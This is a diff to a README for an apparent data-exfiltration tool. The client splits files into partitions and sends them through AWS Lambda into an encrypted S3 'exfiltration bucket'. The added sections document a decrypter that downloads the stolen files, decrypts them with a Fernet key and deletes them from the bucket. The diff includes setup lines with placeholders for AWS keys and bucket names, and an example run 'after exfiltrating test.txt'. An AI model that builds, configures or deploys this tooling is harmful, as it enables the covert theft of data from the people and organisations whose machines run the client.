@@ -1,6 +1,12 @@
 # standaloneClient
 ## Usage
+#### Client
 `py clientName.py "Path_to_file"`
+#### Decrypter
+###### Note: If not sure about hostname and filename, check S3 Bucket
+`py decrypter.py "Hostname" "Filename"`  
+Example after exfiltrating test.txt:  
+`py decrypter.py "ID4A0E" "test"`
 ## Setup
 
 Here we will discuss how to set up a working client for data exfiltration.
@@ -15,7 +21,8 @@ Open `standaloneClient_template.py` and modify the following lines with desired 
 *Line 11*  Modify partition size  
 `partitionSize = 100 #Change for desired partition size`  
 *Line 42*  Modify Orchestrator function name (Remember it)  
-`orq_response = self.aws_lambda.invoke(FunctionName = '<ORCHESTRATOR_FUNCTION_NAME>', Payload = orqPayload_json)`  
+`orq_response = self.aws_lambda.invoke(FunctionName = '<ORCHESTRATOR_FUNCTION_NAME>', 
+                                       Payload = orqPayload_json)`  
 *Line 85* Modify with AWS Keys  
 `client.awsConnect('<ACCESS_KEY_ID>','<SECRET_ACCESS_KEY_ID>','<REGION>')`  
 
@@ -55,3 +62,20 @@ Copy and paste the contents of `orchestrator_template.py` into the newly created
 `'S3Key': '<COMPRESSED_FUNCTION_NAME>'`  
 
 Increase the timeout of this function to 1 minute and memory to 512MB  
+
+#### Decrypter Setup
+Files saved inside our exfiltration bucket are encrypted so... we ned a way to decrypt them. Lets se how to do this.  
+
+Open `sampledecrypter_template.py`  
+
+*Line 7*  Modify fernet key. The key can be generated in a separate script with `Fernet.generate_key()`  
+`key = b'<FERNET_KEY>'`  
+*Line 23-25*  Modify AWS Tokens and region  
+`session = boto3.session.Session(aws_access_key_id = '<AWS_ACCESS_KEY_ID>',
+ 								aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>',
+ 								region_name = 'us-east-2')`  
+*Line 31,58,80,82* Modify Exfiltration bucket name  
+`31- Bucket = '<EXFILTRATION_BUCKET_NAME>'`  
+`58- aws_s3_resource.meta.client.download_file('<EXFILTRATION_BUCKET_NAME>', file, 'downloadedFiles/'+name)'`  
+`80- bucket = aws_s3_resource.Bucket('<EXFILTRATION_BUCKET_NAME>')`  
+`82- aws_s3_resource.Object('<EXFILTRATION_BUCKET_NAME>', file).delete()`  
